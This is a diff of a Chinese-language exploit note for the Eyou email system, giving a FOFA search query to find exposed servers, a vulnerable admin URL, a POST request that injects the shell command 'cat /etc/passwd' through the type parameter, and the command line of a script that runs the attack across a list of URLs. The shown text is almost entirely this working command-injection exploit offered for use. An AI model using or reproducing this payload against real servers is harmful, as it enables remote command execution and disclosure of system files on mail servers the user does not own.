@@ -3,8 +3,8 @@
 # FOFa dork：
 body="亿邮电子邮件系统"
 # 漏洞复现：
-登录页面：
-![image](images/login.png)  
+登录页面:  
+![image](images/login.png)   
 漏洞地址：/webadm/?q=moni_detail.do&action=gragh  
 post包如下：  
 ```
@@ -17,9 +17,9 @@ User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/2010010
 
 type='|cat /etc/passwd||'
 ```
-![image](images/post.png)  
+![image](images/post.png)   
 脚本使用方法：  
-python3 Eyou.py [-]
+python3 Eyou.py [-f  Url.txt]
 
 
 
